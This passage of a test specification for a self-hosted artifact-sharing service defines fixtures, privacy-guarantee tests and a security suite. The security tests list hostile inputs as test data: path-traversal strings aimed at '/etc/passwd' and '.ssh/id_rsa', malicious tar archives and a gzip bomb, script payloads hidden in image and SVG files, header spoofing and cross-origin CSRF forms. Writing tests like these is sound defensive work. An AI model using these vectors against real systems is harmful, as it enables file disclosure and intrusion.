### 14.2.5 Fixed secrets

`secret_key` and `view_salt` are fixed 32-byte test values, so a signed upload URL, a recipient
cookie MAC, and a daily view hash are all reproducible across runs and can be asserted
literally. T-PRIV-06 depends on the salt being *derived per day from* `view_salt`, not equal to
it, and asserts the derivation changes at the UTC day boundary.

### 14.2.6 SMTP sink

An in-process SMTP sink captures every outbound message. Assertions key on the
`X-Share-Template` header the mailer sets from the §12.9 template name (`link_created`,
`link_ending`, `link_ended`, `quota_warning`, `recovery_used`, `counter_regressed`,
`token_created`, `first_link_by_token`, `anomaly_link_rate`, `anomaly_trash_rate`,
`backup_failed`, `disk_high`, `invite`, `artifact_ttl_ending`) — never on subject-line text,
which is Part 12's to change. The sink exposes `sink.of("link_created")` returning parsed
messages with headers, recipients, and both bodies. A test asserting an email was sent also
asserts **no other** template fired, so a notification storm is a failure.

### 14.2.7 WebAuthn test authenticator

A software authenticator (`softwebauthn` or equivalent) with a real P-256 key pair performs
real attestation and assertion. It supports, as first-class controls: replaying a consumed
challenge, signing with the wrong origin, signing with the wrong RP ID hash, holding the
signature counter flat, decrementing it, cloning itself into a second instance with the same
credential ID, and producing a malformed CBOR attestation. **Passkey ceremonies are therefore
exercised for real end to end**; no test asserts sign-in by inserting a `session` row.

### 14.2.8 Fixtures

**Users.**

| Fixture | Handle | Role |
| --- | --- | --- |
| `root_user` | `robert` | `is_root = true`, holds the bare namespace, two passkeys, one recovery code |
| `user_b` | `sarah` | Ordinary user, one passkey |
| `user_c` | `mallory` | Ordinary user, the adversary in cross-space tests |

Each has a live session fixture and a matching `share_csrf` pair.

**Tokens.** For `root_user`, one token per element of the powerset of
{`artifacts:read`, `artifacts:write`, `artifacts:delete`, `share:create`, `account:read`,
`account:admin`} that is reachable in the product, plus these named ones used by most tests:

| Fixture | Scopes |
| --- | --- |
| `tok_agent` | `artifacts:read`, `artifacts:write` — **the agent default** (§4.6.1) |
| `tok_ro` | `artifacts:read` |
| `tok_sharer` | `artifacts:read`, `artifacts:write`, `share:create` |
| `tok_deleter` | `artifacts:read`, `artifacts:write`, `artifacts:delete` |
| `tok_admin` | all six |
| `tok_revoked` | `artifacts:read`, `artifacts:write`; `revoked_at` set |
| `tok_expired` | as above; `expires_at` in the past |
| `tok_disabled_owner` | valid token whose user has `disabled_at` set |
| `tok_b_agent` | `user_b`'s agent-default token |

The full powerset is generated, not hand-written, and `T-AUTH-09` parameterises over it.

**Artifacts**, one per `kind` (§3.4): `bundle` (4 files, entry `/index.html`), `page` (one
HTML file), `document` (one PDF), `image` (one PNG), `video` (a 12 MB MP4 with a real moov
atom, and a 2 GB sparse MP4 built only for the performance suite), `file` (one `.bin`).

**Sharing states**, one artifact in each, all owned by `root_user`:

`private` · `granted` (to `user_b`) · `link` (no password, 14 d) · `link_pw`
(password `civil-marmot-71`) · `link_expired` (`expires_at` one hour in the past, sweep **not**
run) · `link_revoked` (`revoked_at` set) · `trashed` (was link-shared before trashing) ·
`ttl_expired` (`ttl_expires_at` in the past, sweep not run) · `link_maxviews` (`max_views = 2`).

**Multi-version.** `versioned` at seq 5, where seq 1 and 5 share one file, seq 3 is pinned, and
seq 2 references a file no other version does (so collection has something to find).

**Bundles.** `bundle_entry` (has `/index.html`), `bundle_noentry` (three PDFs, no HTML — the
listing page, R7), `bundle_one_html` (one HTML file named `report.html`, exercising §5.5 rule 3),
`bundle_explicit` (explicit `entryPath: /app/start.html`), `bundle_bad_entry` (explicit
`entryPath` not present in the manifest).

### 14.2.9 Isolation

Tests are independent and may run in any order under `pytest -p xdist -n auto --random-order`.
CI runs the suite twice nightly with two different seeds; an order-dependent failure is a bug in
the test, fixed, never retried into green. Redis is flushed and the file root is emptied between
tests. Any test leaving a file in `SHARE_TMP_ROOT` fails in teardown — a leaked `.part` file is
how the write protocol breaks quietly.

## 14.3 Test ID scheme

`T-<AREA>-<NN>`, zero-padded, stable forever. An ID is never reused or renumbered; a retired
test keeps its ID with a `retired:` note so external citations do not rot.

| Area | Covers | Section |
| --- | --- | --- |
| `PRIV` | The nine guarantees P1–P9 | §14.4 |
| `SEC` | Cross-cutting security suite | §14.5 |
| `AUTH` | Passkeys, sessions, tokens, scopes, recovery, device flow | §14.6 |
| `POST` | Declare / upload / commit, bundle upload, naming, dedupe | §14.7 |
| `SERVE` | Resolution, file matching, content types, headers, ranges | §14.8 |
| `SHARE` | Links, passwords, grants, revocation, the visibility matrix | §14.9 |
| `EXP` | Every expiry: links, artifact TTL, sessions, invites, uploads | §14.10 |
| `VER` | Versions, restore, pinning, retention, reference counts | §14.11 |
| `TRASH` | Trash, restore, purge, hard delete | §14.12 |
| `SEARCH` | Metadata search, filters, ranking, scoping | §14.13 |
| `LIMIT` | Rate limits, quotas, size and count ceilings | §14.14 |
| `AUDIT` | Audit events, view rollups, notifications | §14.15 |
| `MCP` | The remote MCP endpoint and its tools | §14.16 |
| `CLI` | The `share` binary | §14.17 |
| `OPS` | Install, backup, restore, collection, `sharectl` | §14.18 |

Every case below states: **level**, **preconditions**, **steps**, **expected result**, and the
**spec section** it verifies.

## 14.4 T-PRIV — the nine privacy guarantees

These nine map one-to-one onto P1–P9 in §1.6.3 and are cited there by ID. They are the release
gate: none may be skipped, quarantined, or marked `xfail` in any branch, ever.

**T-PRIV-01 — an inaccessible artifact is indistinguishable from one that never existed.**
*e2e, `@security`. Verifies P1, §6.5.2, §6.8.*
- **Pre:** `private` exists at `/private-thing` in the root space. `/never-used-name` has never
  existed. No cookies, no `Authorization`. Redis warm for both paths (each requested twice
  before measurement so negative resolution is cached per §6.5.2).
- **Steps:** (a) `GET /private-thing` and `GET /never-used-name`, unauthenticated, capture full
  response. (b) Repeat each 1,000 times, interleaved A/B/A/B to cancel drift, recording
  wall-clock per request. (c) Repeat (a) with `FLUSHDB` before each request to measure the cold
  path. (d) Repeat with a valid session belonging to `user_c` (a signed-in stranger).
- **Expect:** status `404` for all. `r.content` byte-identical between the two paths. Header
  sets identical after removing `Date` — in particular neither carries `X-Share-Artifact`,
  `X-Share-Version`, `ETag`, `Last-Modified`, or a differing `Cache-Control` (both `no-store`).
  Body contains `"code": "not_found"` and nothing naming the artifact. **Median wall-clock
  difference < 2 ms and p99 difference < 10 ms over the 1,000 warm pairs**; the same thresholds
  over 200 cold pairs. Identical results for the signed-in stranger. Also assert the
  `Content-Length` values are equal, since a length difference is a timing-free oracle.

**T-PRIV-02 — nothing is created, updated, or deleted without a credential.**
*Integration, `@security`. Verifies P2, §1.5, §5.2.*
- **Pre:** Route table from `app.routes`.
- **Steps:** Enumerate every route whose method is `POST`, `PUT`, `PATCH`, or `DELETE`,
  excluding `/auth/*` ceremony endpoints, `/s/{token}/unlock`, and `/internal/*`. Call each with
  a well-formed body and (a) no credential, (b) `Authorization: Bearer shr_` + 43 random chars,
  (c) `Cookie: share_s=<random>`, (d) a valid recipient-session cookie. After the whole sweep,
  snapshot row counts for `artifact`, `artifact_version`, `version_file`, `file`, `share_link`,
  `share_grant`, `api_token`, `passkey_credential`, `app_user`, `invite`.
- **Expect:** every call is `401 invalid_token` / `401 session_expired` / `403
  wrong_credential_class` as the endpoint's table specifies — never 2xx, never `500`. Row counts
  after equal row counts before, exactly. `SHARE_FILE_ROOT` unchanged (recursive hash of the
  tree equal). An `auth.signin_failed`-class audit row exists for each attempt that parsed as a
  credential (§4.9).

**T-PRIV-03 — every share-link mutation is audited with the full record.**
*Integration. Verifies P3, §7.3, §10.7.*
- **Pre:** `tok_sharer`, artifact `postcal`.
- **Steps:** Create a link with a password and a 14 d TTL; `PATCH` it to extend to 21 d; `PATCH`
  it to change the password; `DELETE` it. Then let a link expire and run the sweep.
- **Expect:** five `audit_event` rows — `link.create`, `link.update`, `link.password_change`,
  `link.revoke`, `link.expired`. Each carries `actor_type` (`token` for the first four, `system`
  for the last), `actor_token_id = tok_sharer.id`, non-null `ip`, `target_type='share_link'`,
  `target_id`, and `target_label` naming the artifact. `link.create.metadata` matches §10.7
  exactly: `artifact`, `artifactId`, `expiresAt`, `ttl`, `hasPassword: true`, `label`, `url`,
  `maxViews`. Assert `metadata` contains **no** password, no plaintext token beyond the `url`
  field that is the link itself, and that `hasPassword` is a boolean not a hash.

**T-PRIV-04 — no share link is permanent.** *Integration + unit, `@security`. Verifies P4, §7.1,
§2.7, §3.7.*
- **Steps:** (a) `POST /links` with `ttl: null`, `ttl: ""`, `ttl: "never"`, `ttl: "0"`,
  `ttl: "9999d"`, `ttl: "-1d"`, `expiresAt: null`, and an unknown field `permanent: true`.
  (b) Attempt `UPDATE share_link SET expires_at = NULL` directly in SQL. (c) Grep the settings
  schema and the Caddyfile for any key matching `permanent|forever|no_expiry|never_expires`.
  (d) Create 200 links with random valid TTLs.
- **Expect:** (a) `ttl: null` and absent both apply `SHARE_DEFAULT_SHARE_TTL`, never null;
  `"never"`/`"0"`/`"-1d"` are `422 invalid_ttl`; `"9999d"` is `422 ttl_too_long`; the unknown
  field is `422`. (b) the raw `UPDATE` raises a `CheckViolation` on `expiry_required`.
  (c) no such setting exists — the test fails the build if one is added, which is what §2.7's
  "no configuration escape hatch" means operationally. (d) all 200 rows have
  `expires_at IS NOT NULL` and `expires_at <= created_at + SHARE_MAX_SHARE_TTL`.

**T-PRIV-05 — artifact bytes are never read for any inference.** *Integration + static,
`@security`. Verifies P5, §8.7, §6.6.4, §3.4.*
- **Pre:** A PDF containing the phrase `xylophone-quarterly-borogove` and a title in its
  metadata; an HTML file whose `<title>` is `Secret Internal Title`; an MP4 with a duration and
  a poster frame.
- **Steps:** Post all three with **no** `title` supplied. Instrument `open()`,
  `pathlib.Path.read_bytes`, and the async file reader with a counting wrapper for the duration
  of declare, upload, commit, list, get, and search. Then `GET /api/v1/artifacts?q=xylophone`,
  `?q=borogove`, `?q=Secret Internal Title`.
- **Expect:** `artifact.title IS NULL` for all three — no title inferred from PDF metadata or
  `<title>`. `kind` is `document` / `page` / `video`, derived from manifest shape only. The read
  counter shows the upload path read each body exactly once (to hash it) and **zero** reads
  during commit, list, get, or search. All three searches return zero items. No `duration`,
  `width`, `height`, `pageCount`, or `poster` field exists anywhere in the artifact response
  schema — asserted against the OpenAPI document, so adding one fails this test.

**T-PRIV-06 — no full IP address is persisted for a view, and yesterday's hashes are
unrecomputable.** *Integration, `@security`. Verifies P6, §3.8, §10.6.*
- **Steps:** Serve 50 artifact requests from three distinct client addresses across two link
  sources. Flush the view buffer. Then (a) dump every table and assert no column holds any of
  the three addresses in any representation — text, `inet`, packed bytes, or reversed; (b)
  confirm `view_daily` is the only view storage and that no per-request row table exists in the
  schema; (c) recompute the day's hash for a known address with the day's derived salt and
  confirm it matches the HLL input; (d) advance the clock past 00:00 UTC and recompute — assert
  the derived salt differs and the resulting hash differs; (e) assert the same address hashed
  for two different artifacts on the same day yields **different** values (the derivation
  includes the artifact), so views are unlinkable across artifacts.
- **Expect:** all five hold. Note the deliberate exception: `session.ip`, `api_token.last_used_ip`,
  `recovery_code.used_ip`, and `audit_event.ip` **do** hold addresses; the test asserts P6 is
  scoped to *view* records and that `recipient_session.ip_hash` is a hash, never an address.

**T-PRIV-07 — no cross-space read, write, list, or enumeration without an explicit share.**
*Integration, `@security`. Verifies P7, §5.2, §6.5.*
- **Pre:** `user_b` owns `~sarah/deck` (private) and `~sarah/granted-to-c` (granted to
  `user_c`). `user_c` holds `tok_c_admin` with every scope, and a session.
- **Steps:** As `user_c`, for each of ~30 endpoints that take a `{name}` (read, files,
  files/content, versions, versions/{id}/files, activity, links, grants, PATCH, DELETE, restore,
  copy, POST links, POST grants, version restore, pin, …), call it against `~sarah/deck` by
  every addressing form the API accepts. Then `GET /api/v1/artifacts` with `owner=sarah`,
  `q=deck`, `shared=true`, `trashed=true`, every `sort`, and paginate to exhaustion. Then
  `GET /~sarah/deck` and `GET /~sarah/` and `GET /~sarah` over HTTP.
- **Expect:** every `{name}` call is `404 artifact_not_found` (not `403` — a `403` confirms
  existence). Every listing returns only `user_c`'s own artifacts plus `~sarah/granted-to-c`;
  `deck` never appears in `items`, in `nextCursor` positioning, or in a total count (there is no
  total count — asserted). `GET /~sarah/deck` is `404`; `GET /~sarah/` and `/~sarah` are `404`
  with the same body (P1 — there is no space listing, §6.6.2). Additionally: `copy` of
  `~sarah/granted-to-c` succeeds (§7.7.1) while `PATCH`/`DELETE`/`POST links` on it are
  `403 not_your_artifact`, proving a grant conveys read only.

**T-PRIV-08 — purge removes rows, dereferences files, and the next collection removes bytes.**
*Integration `@commit_required`. Verifies P8, §3.6, §8.4.*
- **Pre:** `tok_deleter`. Artifact `doomed` with 3 versions and 5 distinct files, one of which
  (`shared.css`) is also referenced by artifact `survivor`.
- **Steps:** Record `file.ref_count` for all five and the on-disk paths. `DELETE
  /api/v1/artifacts/doomed?purge=true`. Assert immediately. Advance the clock 25 hours. Run the
  collection job. Assert again. Run it a second time.
- **Expect:** immediately after purge — `artifact`, `artifact_version`, `version_file`, and
  `artifact_tag` rows for `doomed` are gone (hard, not `trashed_at`); `share_link` and
  `share_grant` rows cascade away; `ref_count` for the four exclusive files is `0` and for
  `shared.css` is decremented by 3 but still `> 0`; **the bytes are still on disk** (the 24 h
  grace, §3.6). After collection — the four blobs and their `.br`/`.gz` siblings are gone, empty
  shard directories are pruned, `file` rows are gone, `shared.css` is untouched and still
  served, `survivor` still renders. The second run is a no-op with an empty summary. An
  `artifact.purge` audit row exists with `actor_token_id`.

**T-PRIV-09 — revocation kills every recipient session on the next request.** *e2e,
`@security`. Verifies P9, §7.4, §3.7, §2.4.2.*
- **Pre:** `link_pw` on artifact `postcal`. Three separate browser contexts unlock it and each
  holds a live `share_r_*` cookie; each has fetched `/s/{t}/` and `/s/{t}/style.css` so the
  resolution, manifest, and token caches are warm.
- **Steps:** Three independent runs. (a) `DELETE /api/v1/links/{id}`. (b) `PATCH
  /api/v1/links/{id}` with a new password. (c) `DELETE /api/v1/artifacts/postcal` (trash). In
  each, immediately — **without advancing the clock, without flushing Redis, without restarting
  anything** — replay the three contexts' next request.
- **Expect:** (a) `410 link_expired` on `/s/{t}/` and `404` on `/s/{t}/style.css`; `SELECT count(*)
  FROM recipient_session WHERE share_link_id = … AND revoked_at IS NULL` is `0`. (b) `401
  recipient_auth_required`, and the *old* password fails at `/unlock` while the new one
  succeeds and mints a new session. (c) `410` on the entry page. In all three the Redis keys
  `sh:tok:{sha}` and `sh:sess:*` for those sessions are absent, proving the `DEL` was explicit
  rather than a TTL expiry. Repeat (a) with the clock frozen to prove no time-based path is
  involved.

## 14.5 T-SEC — the security suite

Every case here carries `@security`. §14.22.4 governs what a failure means.

### 14.5.1 Path traversal and normalisation

**T-SEC-01 — traversal in request paths.** *e2e.* Against `/postcal/…` as the owner, request
each of ~60 vectors: `../../../etc/passwd`, `..%2f..%2fetc/passwd`, `..%252f`, `%2e%2e/`,
`%2e%2e%2f`, `....//`, `..\..\`, `/postcal/./../../file`, `//etc/passwd`, `/postcal//style.css`,
a path with `%00`, a path with a raw NUL, `C:\windows\win.ini`, `\\?\C:\`, a 40-segment path, a
2 KB path, a path with `\u202e` (Cf category), an NFD-composed path whose NFC form exists, and
UTF-8 overlong encodings of `/` and `.`. **Expect:** every one is `404 not_found` with the
canonical body; none is `200`, `301`, `308`, or `500`. Assert via a filesystem watcher that no
`open()` occurred outside `SHARE_FILE_ROOT`. Assert the NFC case specifically: the NFD request
either resolves to the NFC file (per §6.4 step 4) or `404`s, but never escapes. Verifies §6.4.

**T-SEC-02 — traversal in declared manifests.** *Integration.* Declare artifacts whose
`files[].path` is each of: `../outside.txt`, `/../outside.txt`, `a/../../b`, `/a//b`, `/a/./b`,
`` (empty), `/`, `.`, `..`, `a/`, `/.git/config`, `/.env`, `/.ssh/id_rsa`, `/.well-known/x`,
`C:\x`, a 1,100-byte path, a 300-byte segment, a 33-segment path, a path containing `\x00`, a
path containing `\x1f`, and `/A.txt` alongside `/a.txt`. **Expect:** `422 invalid_path` for the
traversal and control-character cases; `422 dotfile_rejected` for `.git`, `.env`, `.ssh`;
**`201` for `/.well-known/x`** (the sole exception, §6.4 step 7); `422 path_case_collision` for
the last; `detail.fields[0].path` naming the offending index in every case. Zero rows written on
any rejection. Verifies §6.4, §5.12.

**T-SEC-03 — traversal and hostility in tar archives.** *Integration.* `POST
/api/v1/artifacts/bundle` with archives containing, one per case: an entry named `../x`, an
absolute `/etc/x`, a symlink to `/etc/passwd`, a symlink to `../`, a hardlink out of tree, a
device node, a FIFO, a directory entry with mode `0777` and a setuid bit, a 5,001-entry archive,
an entry declaring 800 MB of a 200 MB budget, a 10 KB gzip expanding to 2 GB (ratio 200,000:1), a
tar with a truncated final block, a tar with a PAX header overriding the path to `../x`, a tar
with a GNU long-name entry containing `..`, and a zip renamed to `.tar`. **Expect:**
`422 invalid_archive` for structural hostility, `422 archive_ratio_exceeded` for the bomb,
`413 too_many_files` for 5,001, `413 artifact_too_large` for over-budget expansion. In every
case: nothing extracted outside the temp dir (filesystem watcher), the temp dir removed at
teardown, zero `file` rows created, and the process peak RSS under 512 MB — a bomb must fail
*before* materialising. Verifies §5.6.

**T-SEC-04 — double encoding is always an attack.** *e2e.* Request `/postcal/%252e%252e%252f`,
`/postcal/%25 2e`, `/s/%252e%252e/x`, `/api/v1/artifacts/%252e%252e`, and a name declared as
`%2e%2e` at post time. **Expect:** all `404`/`422`; specifically, a path that percent-decodes
once to a string still containing a `%` sequence that would decode further is rejected outright
rather than decoded twice (§6.4 step 1). Assert with a probe artifact literally named
`a%2fb`-decoded (`a/b`) that single-decoding still works, so the rule does not over-reject.

### 14.5.2 Header spoofing and credential class

**T-SEC-05 — client-supplied `X-Share-*` headers are stripped.** *e2e.* Send
`GET /never-used-name` with `X-Share-File: ab/cd/<sha of a private blob>`,
`X-Share-Artifact: art_…`, `X-Share-Actor: usr_root`, `X-Share-Content-Type: text/html`,
`X-Share-CSP:`, `X-Share-Version: ver_…`, plus lowercase, mixed-case, underscore
(`X_Share_File`), duplicated, and continuation-folded variants. Also send them to `/api/v1/*`,
`/s/{token}`, and `/mcp`. **Expect:** `404` for the artifact path with no blob served — the
private blob's bytes never appear in any response body across the whole sweep. `/internal/authorize`
sees no `X-Share-*` request header (asserted by an in-process recorder). The API never trusts
`X-Share-Actor` for identity: a request carrying it and no cookie is anonymous. Verifies §2.4.
**Additionally** assert `X-Forwarded-For` from a non-loopback peer does not change the IP used
for rate limiting or audit, since `trusted_proxies` is loopback-only.

**T-SEC-06 — content-type confusion.** *e2e.* Post a bundle where `logo.png` contains
`<script>fetch('/api/v1/artifacts')</script>` and declares `contentType: text/html`; `x.svg`
declares `text/html`; `evil.html` declares `image/png`; `f.woff2` declares
`text/javascript`; `data.bin` declares nothing; `page.html` declares `text/html`. **Expect:**
`logo.png` is served `image/png` (extension wins, §6.6.3), `x.svg` as `image/svg+xml` with the
SVG CSP, `evil.html` as **`image/png`** — the declared type is honoured only where it does not
conflict with an image/video/font extension, and the coercion rule is asserted in both
directions with an explicit table in the test. `data.bin` is `application/octet-stream` with
`Content-Disposition: attachment`. `X-Content-Type-Options: nosniff` present on all. A headless
browser loading `/artifact/logo.png` executes nothing (a `window.__pwned` sentinel stays
undefined). Verifies §6.6.3.

**T-SEC-07 — a recipient credential authorises nothing but its own link.** *e2e.* **This is the
test cited by §4.7.**
- **Pre:** `link_pw` on `postcal` (link L1) and a second link L2 on artifact `other`. A
  recipient unlocks L1 and holds cookie `share_r_<L1 prefix>` with value
  `{rcp_id}.{HMAC}`. The raw share token for L1 is `T1`.
- **Steps:** Present the recipient cookie, and separately the raw token `T1` as
  `Authorization: Bearer T1`, as `Cookie: share_s=T1`, and as `?token=T1`, to: every
  `/api/v1/*` route (all methods), `/~/artifacts`, `/~/settings`, `/~/tokens`, `/mcp`
  (initialize and `tools/call share_list`), `/auth/passkey/login/begin`, and
  `/api/v1/artifacts/postcal/files/content?path=/index.html`. Then send the L1 recipient cookie
  to `/s/{T2}/` and to `/other` and `/~robert/other`. Then rename cookie `share_r_<L1>` to
  `share_r_<L2 prefix>` keeping the same value and send it to `/s/{T2}/`. Then take a valid L1
  cookie and tamper one byte of the HMAC, and separately swap in another session's `rcp_` id
  with L1's MAC.
- **Expect:** every `/api/v1/*` and `/~/*` call returns `403 wrong_credential_class` (or `401
  invalid_token` where the credential does not parse as `shr_`), never 2xx and never a partial
  body. `/mcp` returns a JSON-RPC error carrying `wrong_credential_class`. The L1 cookie at
  `/s/{T2}/` is treated as absent → `401 recipient_auth_required` for a password link or `404`
  for the artifact path, and **the browser never sends it at all**, asserted at e2e level by
  reading the request Caddy received: `Path=/s/{token}` scoping means no cross-link
  transmission (§4.7). The renamed cookie is rejected because the session row's
  `share_link_id` does not match L2. Both tampered forms fail the MAC or the row lookup and are
  rejected in constant time (median delta < 1 ms over 500 samples). No audit event records the
  recipient as a user. Verifies §4.7, §4.9, §6.5.

**T-SEC-08 — SVG scripts are inert, verified in a browser.** *e2e.* Post an SVG containing
`<script>window.__pwned=1</script>`, an `onload=` attribute, a `<foreignObject>` with an
`<iframe src="/api/v1/artifacts">`, and an `<image href="https://example.invalid/x">`. Load it
in a headless Chromium **as a top-level document** and again inside `<img>`. **Expect:**
response carries `Content-Security-Policy: default-src 'none'; style-src 'unsafe-inline'`;
`window.__pwned` is undefined; the console shows CSP violation reports for the script and the
external image; zero outbound network requests leave the browser to any host but `share.test`
(asserted from the browser's own request log). Verifies §6.6.3.

### 14.5.3 Upload integrity and signed URLs

**T-SEC-09 — hash mismatch quarantines and leaves the session retryable.** *Integration.*
Declare a 3-file artifact. `PUT` correct bytes for file 1; for file 2 `PUT` bytes whose digest
differs; for file 3 `PUT` correct bytes but a `Content-Length` one byte short and, separately,
one byte long. **Expect:** file 2 → `400 file_hash_mismatch`, the body written to
`SHARE_QUARANTINE`/ with a name containing the *declared* digest and a timestamp, mode `0640`,
and **no file appears in `SHARE_FILE_ROOT`**; `sh:up:{sid}` still lists file 2 as pending; a
retry with correct bytes succeeds and commit then works. File 3 → `400 file_size_mismatch` with
nothing quarantined for the short case (the stream ended early) and quarantine for the long
case. `SHARE_TMP_ROOT` is empty after each. Quarantined files older than 24 h are removed by the
worker; a fresh one is not. Verifies §3.5, §5.4.

**T-SEC-10 — signed upload URLs cannot be tampered with.** *Integration.* Take a valid
`PUT /api/v1/files/{sha}?sid=&exp=&sig=`. Mutate, one at a time: the `sha256` in the path to
another declared file's hash; the `sha256` to a hash not in the session; `sid` to another
session of the same user; `sid` to another **user's** session; `exp` to a later value keeping
the old `sig`; `sig` by one hex character; `sig` truncated; `sig` removed; `sig` from a
different file in the same session; the whole query re-signed with a guessed key. Also try a
valid signature with the parameters reordered and with `sid` duplicated. **Expect:**
`403 upload_signature_invalid` for all, in constant time (the comparison is `hmac.compare_digest`
— asserted by a median-delta measurement < 0.5 ms over 500 samples between a signature differing
in the first byte and one differing in the last). No bytes are read from the request body before
the signature check — asserted by sending `Content-Length: 5000000` with a slow body and
observing the rejection arrives before 1 MB is consumed. Verifies §5.4 phase 2.

**T-SEC-11 — signed URLs expire and do not survive their session.** *Integration.* (a) Advance
the clock past `exp` and `PUT` → `403 upload_signature_invalid`. (b) Commit the session, then
`PUT` a still-unexpired URL from it → `409 upload_session_closed`. (c) Let the session expire
and the cleanup job run, then `PUT` → `403`/`409`, never `200`. (d) Abort the session, then
`PUT` → `409 upload_session_closed`. Verifies §5.7.

**T-SEC-12 — cross-session and cross-user reuse of a signed URL.** *Integration.* User A and
user B each declare an artifact containing the same file hash. Take A's signed URL and present
it while authenticated as B, and unauthenticated. Take A's URL and change only `sid` to B's
session id. **Expect:** the URL works exactly once, for A's session, regardless of who presents
it (the signature *is* the credential, §5.4) — so the unauthenticated and B-authenticated cases
both succeed **against A's session**, and the test asserts the bytes land under A's session's
pending set and **not** B's, and that B's session remains pending. The `sid`-swapped URL is
`403`. This is the case most likely to be implemented wrong: the signature must bind `sid`, so a
URL cannot be retargeted, but it must not require a bearer token.

### 14.5.4 CSRF, framing, and the dashboard

**T-SEC-13 — CSRF on every unsafe dashboard method.** *e2e.* For each unsafe route reached with
a `share_s` cookie: (a) omit `X-Share-CSRF`; (b) send a mismatched value; (c) send the header
but no `share_csrf` cookie; (d) send both matching (control); (e) submit a cross-origin
`<form method=POST>` from `https://evil.test` with the cookie present; (f) same with
`SameSite` behaviour observed for a top-level `GET` navigation. **Expect:** (a)–(c) are
`403 csrf_failed` with no state change; (d) succeeds; (e) never carries the cookie
(`SameSite=Lax`) and additionally fails the double-submit check; (f) a top-level `GET` to
`/~/artifacts` does carry the cookie, which is why no unsafe action is a `GET` — the test walks
the route table and asserts **no `GET` route mutates state**, by snapshotting row counts around
a call to every `GET`. Verifies §4.4.

**T-SEC-14 — framing rules, including the password-gate exception.** *e2e.* Post artifact `A`
with `allowFraming: true` and `B` without. Create a password link on `A`. **Expect:** `B` is
served `X-Frame-Options: SAMEORIGIN`; `A` at its owner URL omits `X-Frame-Options`; `A` reached
through the **password-protected** link is served `SAMEORIGIN` and the commit/serve response
carries a `framing_ignored_password_link` warning (§6.6.6). A headless browser confirms the
gate page cannot be framed from `https://evil.test`. Verifies §6.6.6.

### 14.5.5 Resolution abuse and cross-space writes

**T-SEC-15 — longest-prefix shadowing cannot read another artifact's files.** *Integration +
e2e.* `user_b` owns `~sarah/q3/report` (bundle with `/img/a.png`). As `user_c`, attempt to
create `~sarah/q3` — impossible, there is no cross-space write (asserted). As `user_b`, create
`q3` containing a file at `/report/img/a.png`. **Expect:** posting `q3` returns a
`shadowing_name` warning (§6.5.1); `/~sarah/q3/report/img/a.png` now resolves to **`q3`'s** file
by longest-prefix — the test asserts the served bytes are `q3`'s, and that this is only
reachable by the owner of both. Then the inverse: `user_b` creates `q3/report/img/a.png` as its
own artifact name; assert `/~sarah/q3/report/img/a.png` resolves to that artifact (longest wins)
and that resolving it does **not** consult `q3/report`'s manifest. Finally, as `user_c` holding a
share link to `~sarah/q3/report`, request `/s/{token}/../q3/x`, `/s/{token}/img/../../a` and
confirm the recipient's path space is confined to the one artifact (`404`). Verifies §6.5.1.

**T-SEC-16 — cross-space write attempts on every write endpoint.** *Integration.* Parameterised
over every `POST`/`PUT`/`PATCH`/`DELETE` route taking an artifact, link, grant, version, or
token identifier. As `user_c` with all scopes, target `user_b`'s objects by name, by ULID, by
`~sarah/name`, and by a name that also exists in `user_c`'s own space (the confusion case).
**Expect:** `404 artifact_not_found` where the identifier is a name (existence must not leak),
`403 not_your_artifact` where the identifier is an opaque ULID the caller could only have from a
legitimate share, `404 link_not_found` / `404 grant_not_found` for those. Where the name also
exists locally, the write lands on **`user_c`'s own** artifact and `user_b`'s is byte-identical
before and after. No request body field named `userId`, `owner`, `handle`, or `space` changes
the target — asserted by injecting each into every write body and diffing outcomes (§5.2).

**T-SEC-17 — the dedupe oracle is closed.** *Integration.* `user_b` posts a file with a
distinctive hash H that `user_c` has never held. `user_c` then declares an artifact containing
H. **Expect:** `skipped == 0`, `uploads` contains H, `totalFiles` is correct. `user_c` uploads
it; the server detects the existing blob and returns `200` **without writing a second copy**
(assert one file on disk, `ref_count` incremented). `user_c` declares H again → now
`skipped == 1`. The test also asserts response timing for the first declare is within 2 ms
median of a declare for a hash nobody holds, over 300 samples — so neither the count nor the
latency answers "does anyone hold these bytes". Verifies §5.4.1, §3.5.

### 14.5.6 Enumeration and timing oracles

**T-SEC-18 — artifact-name enumeration.** *e2e.* Sample 1,000 existing-but-inaccessible names
and 1,000 never-used names in the root space and in `~sarah`. Compare status, body bytes,
`Content-Length`, header set, and latency distribution (median and p95). Repeat for names that
are a prefix of an existing name, names that would shadow one, names differing only in case, and
names of trashed and TTL-expired artifacts. **Expect:** one indistinguishable response for all.
Median latency delta < 2 ms; **a Kolmogorov–Smirnov test on the two latency samples does not
reject the null at p < 0.01** — a stronger check than the median, added because a bimodal
distribution can share a median. Verifies P1, §6.5.2.

**T-SEC-19 — share-token enumeration and entropy.** *`@real_entropy`, integration.* Request
`/s/{t}` for 1,000 well-formed but unused tokens, 1,000 malformed ones (wrong length, base64url
alphabet, ambiguous base58 characters `0OIl`), the token of a revoked link, and the token of an
expired link. **Expect:** unused and malformed → `404 not_found` (never `410` — `410` is only
for a token that *was* real, §7.6); revoked and expired → `410 link_expired` with a body that
names no artifact, no owner, no title, no file type, and no expiry date. Latency medians within
2 ms across all four classes. Separately, generate 10,000 tokens: all 22 base58 characters, no
character outside the alphabet, no duplicates, and a chi-squared uniformity test over positions
passing at p > 0.01. Verifies §7.3.1, §7.6.

**T-SEC-20 — handle and user enumeration.** *Integration.* `POST /api/v1/artifacts/{name}/grants`
with `handle` = an existing user, a non-existent user, a reserved handle (`admin`, `root`,
`www`), the caller's own handle, and a user who already has a grant. Also `GET /~nonexistent/x`
and `GET /~sarah/x`. **Expect:** grant to a real user succeeds; **`404 user_not_found` for a
non-existent handle and `404 user_not_found` for a reserved one** — a reserved handle must not
be distinguishable from a free one; `409 cannot_grant_to_self`; `409 grant_exists`. Latency for
existing vs non-existing handles within 2 ms median over 500 samples, which requires the
argon2-free path to do equal work. `GET /~nonexistent/x` and `GET /~sarah/x` are byte-identical
`404`s, so a space's existence does not leak either.

**T-SEC-21 — password-gate timing and behaviour.** *e2e.* Against `link_pw`, submit the correct
password, a wrong password of the same length, a wrong password of very different length, an
empty password, a 10 KB password, and the correct password for a *different* link. **Expect:**
`303` only for the correct one; `401 recipient_auth_failed` otherwise; the response body is
identical for every failure. Because argon2id runs on the real parameters, timing is dominated
by the KDF: assert the median delta between wrong-password and correct-password (up to the
redirect) is < 15 ms, and that the empty and 10 KB cases still run a full KDF (no early return)
— asserted by their latency being within the same band. Verifies §7.4.

### 14.5.7 WebAuthn abuse

